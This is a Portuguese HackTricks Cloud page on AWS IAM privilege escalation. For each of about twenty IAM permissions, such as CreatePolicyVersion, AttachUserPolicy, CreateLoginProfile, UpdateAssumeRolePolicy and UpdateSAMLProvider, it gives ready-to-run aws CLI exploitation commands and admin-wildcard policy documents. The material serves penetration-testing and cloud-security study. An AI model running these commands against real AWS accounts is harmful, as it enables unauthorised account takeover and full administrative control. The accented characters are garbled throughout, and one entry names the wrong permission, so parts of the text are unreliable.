# AWS - IAM Privesc

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## IAM

Para mais informa√ß√µes sobre IAM, consulte:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

Um atacante com a permiss√£o **`iam:CreatePolicyVersion`** pode criar uma **nova vers√£o de uma pol√≠tica IAM √† qual tenha acesso**. Isso permite que eles definam suas **pr√≥prias permiss√µes personalizadas**. Ao criar uma nova vers√£o de pol√≠tica, √© necess√°rio **defini-la como a vers√£o padr√£o para que tenha efeito**, o que voc√™ pensaria que exigiria a permiss√£o `iam:SetDefaultPolicyVersion`, mas ao criar uma nova vers√£o de pol√≠tica, √© poss√≠vel incluir um sinalizador (**`--set-as-default`**) que automaticamente a criar√° como a **nova vers√£o padr√£o**. Esse sinalizador **n√£o** **exige** a permiss√£o `iam:SetDefaultPolicyVersion` para ser usado.

Um exemplo de comando para explorar esse m√©todo pode parecer com isso:
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
Onde o arquivo `policy.json` incluiria um **documento de pol√≠tica que permite qualquer a√ß√£o contra qualquer recurso na conta**.

**Impacto Potencial:** Escala√ß√£o de privil√©gios direta para tudo.

### `iam:SetDefaultPolicyVersion`

Um atacante com a permiss√£o **`iam:SetDefaultPolicyVersion`** pode ser capaz de escalar privil√©gios atrav√©s de **vers√µes de pol√≠ticas existentes que n√£o est√£o atualmente em uso**. Se uma **pol√≠tica √† qual eles t√™m acesso** tem vers√µes que **n√£o s√£o a padr√£o**, eles poderiam mudar a vers√£o padr√£o para qualquer outra vers√£o existente.

{% hint style="warning" %}
Se a **pol√≠tica** que voc√™ est√° **modificando** a vers√£o √© a mesma que est√° **concedendo** ao atacante a permiss√£o `SetDefaultPolicyVersion`, e a **nova vers√£o n√£o concede** essa permiss√£o, o atacante **n√£o poder√° retornar a pol√≠tica ao seu estado original**.
{% endhint %}

Um exemplo de comando para explorar este m√©todo pode parecer com isto:
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
Onde "v2" √© a vers√£o da pol√≠tica com mais privil√©gios dispon√≠veis.

**Impacto Potencial:** Privesc indireto definindo uma vers√£o de pol√≠tica diferente que pode conceder mais permiss√µes.

### `iam:CreateAccessKey`

Um atacante com a permiss√£o **`iam:CreateAccessKey`** em outros usu√°rios pode **criar um ID de chave de acesso e chave de acesso secreta pertencentes a outro usu√°rio** no ambiente AWS, se eles ainda n√£o tiverem dois conjuntos associados a eles (o que a melhor pr√°tica diz que n√£o deveriam).

Um exemplo de comando para explorar este m√©todo pode parecer com isto:
```bash
aws iam create-access-key --user-name <target_user>
```
Onde target\_user possui um conjunto de permiss√µes mais extenso em compara√ß√£o com o usu√°rio atual.

**Impacto Potencial:** Privesc direto para qualquer usu√°rio.

### `iam:CreateLoginProfile`

Um atacante com a permiss√£o `iam:CreateLoginProfile` em outros usu√°rios pode **criar uma senha** para usar para **entrar** no console da AWS em **qualquer usu√°rio que ainda n√£o tenha um perfil de login configurado**.

Um exemplo de comando para explorar este m√©todo pode ser assim:
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
Essa senha garante que ela atender√° aos **requisitos m√≠nimos de senha da conta**.

**Impacto Potencial:** Privesc direto para "qualquer" usu√°rio.

### `iam:UpdateLoginProfile`

Um atacante com a permiss√£o **`iam:UpdateLoginProfile`** em outros usu√°rios pode **alterar a senha usada para fazer login no console da AWS** em qualquer usu√°rio que **j√° tenha um perfil de login configurado**.

Assim como criar um perfil de login, um exemplo de comando para explorar esse m√©todo pode ser assim:
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
Essa senha garante que ela atender√° aos **requisitos m√≠nimos de senha da conta**.

**Impacto Potencial:** Privesc direto de "qualquer" usu√°rio.

### `iam:UpdateAccessKey`

Um atacante com **`iam:UpdateAccessKey`** poderia **ativar uma chave de acesso desativada** e us√°-la (ele precisaria ter a chave de acesso desativada)

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**Impacto Potencial:** Privesc direto para acessar o usu√°rio chave (necessitando ter a chave).

### `iam:CreateServiceSpecificCredential`

Permite **gerar** um **nome de usu√°rio** e uma **senha** que podem ser usados para **acessar o servi√ßo especificado** na solicita√ß√£o (**CodeCommit ou Amazon Keyspaces** -- Apache Cassandra--).

As novas credenciais espec√≠ficas do servi√ßo t√™m as **mesmas permiss√µes do usu√°rio associado** exceto que s√≥ podem ser usadas para acessar o servi√ßo especificado.

√â poss√≠vel ter apenas um **m√°ximo de dois conjuntos de credenciais espec√≠ficas do servi√ßo para cada** servi√ßo suportado por usu√°rio.

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
{% endcode %}

**Impacto Potencial:** Privesc direto para permiss√µes de servi√ßo do usu√°rio.

### `iam:ResetServiceSpecificCredential`

Semelhante a **`iam:CreateServiceSpecificCredential`**, mas em vez de criar novas credenciais, redefinindo uma.

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
{% endcode %}

**Impacto Potencial:** Privesc direto para permiss√µes de servi√ßo do usu√°rio.

### `iam:AttachUserPolicy`

Um atacante com a permiss√£o **`iam:AttachUserPolicy`** pode escalar privil√©gios **anexando uma pol√≠tica a um usu√°rio ao qual t√™m acesso**, adicionando as permiss√µes dessa pol√≠tica ao atacante.

Um exemplo de comando para explorar este m√©todo pode ser assim:
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**Impacto Potencial:** Privesc direto para qualquer coisa.

### `iam:AttachGroupPolicy`

Um atacante com a permiss√£o **`iam:AttachGroupPolicy`** pode escalar privil√©gios **anexando uma pol√≠tica a um grupo** do qual faz parte, adicionando as permiss√µes dessa pol√≠tica ao atacante.
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Onde o grupo √© um grupo do qual o usu√°rio atual faz parte.

**Impacto Potencial:** Privesc direto para qualquer coisa (se o usu√°rio estiver dentro de um grupo).

### `iam:AttachRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

Um atacante com a permiss√£o **`iam:AttachRolePolicy`** pode escalar privil√©gios **anexando uma pol√≠tica a uma fun√ß√£o** √† qual t√™m acesso, adicionando as permiss√µes dessa pol√≠tica ao atacante.
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Onde a fun√ß√£o √© uma fun√ß√£o que o usu√°rio atual pode assumir temporariamente com `sts:AssumeRole`.

**Impacto Potencial:** Privesc direto para qualquer coisa.

### `iam:PutUserPolicy`

Um atacante com a permiss√£o `iam:PutUserPolicy` pode **escalar privil√©gios criando ou atualizando uma pol√≠tica inline para um usu√°rio** ao qual tenham acesso, adicionando as permiss√µes dessa pol√≠tica ao atacante.
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
Voc√™ pode usar uma pol√≠tica como:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**Impacto Potencial:** Privesc direto para qualquer coisa.

### `iam:PutGroupPolicy`

Um atacante com a permiss√£o `iam:PutGroupPolicy` pode escalar privil√©gios **criando ou atualizando uma pol√≠tica inline para um grupo do qual faz parte**, adicionando as permiss√µes dessa pol√≠tica ao atacante.
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
Onde o grupo √© **um grupo do qual o usu√°rio atual faz parte**.

**Impacto Potencial:** Privesc direto para qualquer coisa.

### `iam:PutRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

Um atacante com a permiss√£o **`iam:PutRolePolicy`** pode escalar privil√©gios **criando ou atualizando uma pol√≠tica inline para um papel ao qual eles t√™m acesso**, adicionando as permiss√µes dessa pol√≠tica ao atacante.

Um exemplo de comando para explorar este m√©todo pode parecer o seguinte:
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
Onde a fun√ß√£o √© uma fun√ß√£o que o usu√°rio atual pode assumir temporariamente com `sts:AssumeRole`.

**Impacto Potencial:** Privesc direto para qualquer coisa.

### `iam:AddUserToGroup`

Um atacante com a permiss√£o **`iam:AddUserToGroup`** pode us√°-la para **se adicionar a um Grupo IAM existente** na conta AWS.
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
Onde **target\_group tem mais/diferentes privil√©gios** do que a conta de usu√°rio do atacante.

**Impacto Potencial:** Privesc direto para qualquer grupo.

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

Um atacante com as permiss√µes `iam:UpdateAssumeRolePolicy` e `sts:AssumeRole` seria capaz de **alterar o documento de pol√≠tica de assun√ß√£o de fun√ß√£o de qualquer fun√ß√£o existente** para permitir que assumam essa fun√ß√£o.
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
Onde a pol√≠tica se parece com o seguinte, que d√° ao usu√°rio permiss√£o para assumir a fun√ß√£o:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impacto Potencial:** Privesc direto para qualquer fun√ß√£o.

### `iam:UploadSSHPublicKey`

Um atacante com `iam:DeactivateMFADevice` pode fazer upload de uma **chave p√∫blica SSH e associ√°-la ao usu√°rio IAM especificado**([Saiba mais](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html)).

A chave p√∫blica SSH carregada por essa opera√ß√£o s√≥ pode ser usada para **autenticar o usu√°rio IAM associado a um reposit√≥rio CodeCommit**. Para mais informa√ß√µes sobre como usar chaves SSH para autentica√ß√£o em um reposit√≥rio CodeCommit, veja [Configurar CodeCommit para conex√µes SSH](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html) no _Guia do Usu√°rio CodeCommit_.
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**Impacto Potencial:** Privesc indireto para o CodeCommit.

### `iam:DeactivateMFADevice`

Um atacante com `iam:DeactivateMFADevice` pode **desativar o dispositivo MFA especificado** e remover sua associa√ß√£o com o usu√°rio IAM para o qual foi originalmente habilitado ([Saiba mais](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html)).
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**Impacto Potencial:** Privesc indireto de um usu√°rio se voc√™ j√° conhece o nome de usu√°rio e senha dele, desativando o dispositivo MFA.

### `iam:ResyncMFADevice`

Um atacante com `iam:ResyncMFADevice` pode **sincronizar o dispositivo MFA especificado** com uma entidade IAM: usu√°rio ou fun√ß√£o ([Saiba mais](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html)).
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**Impacto Potencial:** Privesc indireto de um usu√°rio se voc√™ j√° conhece seu nome de usu√°rio e senha, adicionando um dispositivo MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Com essas permiss√µes, voc√™ pode **alterar os metadados XML da conex√£o SAML**. Ent√£o, voc√™ poderia abusar da **federa√ß√£o SAML** para **entrar** com qualquer **papel que confie** nela.

Observe que, ao fazer isso, **usu√°rios leg√≠timos n√£o poder√£o entrar**. No entanto, voc√™ poderia obter o XML, para que possa colocar o seu, entrar e configurar o anterior de volta.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: Uma ferramenta capaz de gerar os metadados SAML e fazer login com um papel especificado
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(N√£o tenho certeza sobre isso) Se um atacante tiver essas **permiss√µes**, ele poderia adicionar um novo **Thumbprint** para conseguir fazer login em todos os pap√©is que confiam no provedor.

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
## Refer√™ncias

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
